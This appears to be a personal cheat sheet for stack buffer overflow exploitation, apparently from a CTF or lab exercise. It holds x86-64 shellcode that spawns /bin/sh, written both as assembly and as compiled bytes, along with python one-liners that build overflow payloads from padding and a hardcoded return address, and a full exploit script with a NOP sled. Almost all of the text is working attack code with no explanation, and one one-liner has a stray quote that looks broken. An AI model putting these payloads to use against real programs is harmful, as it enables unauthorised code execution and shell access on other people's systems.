## Shell snippets
/bin/sh little endian hex -> 0x1168732f6e69622f

## One liner for shell
```
$(python3 -c 'import sys; sys.stdout.buffer.write(b"shellcode goes here" + b"A"*43 + b"\xb0\xe5\xff\xff\xff\x7f")')

```

## One liner for code execution with sigkill
```
$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xcc" + b"A"*135 + b"\xb0\xe5\xff\xff\xff\x7f")')
You can cut out the last null bytes on the address and still have it work

```

## Shellcode
```
.global _start
_start:
.intel_syntax noprefix
    mov rax, 0x1168732f6e69622f
    shl rax, 0x08
    shr rax, 0x08
    push rax
    xor rax, rax
    mov al, 59
    xor rdi, rdi
    mov rdi, rsp
    xor rsi, rsi
    mov sil, 1
    dec sil
    xor rdx, rdx
    mov dl, 1
    dec dl
    syscall 

compiled = 
H\xb8/bin/sh\x11H\xc1\xe0\x08H\xc1\xe8\x08PH1\xc0\xb0;H1\xffH\x89\xe7H1\xf6@\xb6\x01@\xfe\xceH1\xd2\xb2\x01\xfe\xca\x0f\x05
```

## One liner with shellcode
```
$(python3 -c 'import sys; sys.stdout.buffer.write(b"H\xb8/bin/sh\x11H\xc1\xe0\x08H\xc1\xe8\x08PH1\xc0\xb0;H1\xffH\x89\xe7H1\xf6@\xb6\x01@\xfe\xceH1\xd2\xb2\x01\xfe\xca\x0f\x05" + b"A"*12 + b" + b"\xb0\xe5\xff\xff\xff\x7f")'; cat)
```

## Exploit Script
```
#!/usr/bin/python3
import sys

exploit = ""
# add the nop sled
exploit += "\x90"*30
# add the shellcode
exploit += "H\xc7\xc0;\x00\x00\x00H\x8d=\x10\x00\x00\x00H\xc7\xc6\x00\x00\x00\x00H\xc7\xc2\x00\x00\x00\x00\x0f\x05/bin/sh\x00"
# add the rest of the padding
exploit += "A"*22
# add the address of the start of the buffer
exploit += "\xb0\xe5\xff\xff\xff\x7f\x00\x00"

sys.stdout.buffer.write(exploit.encode())
```
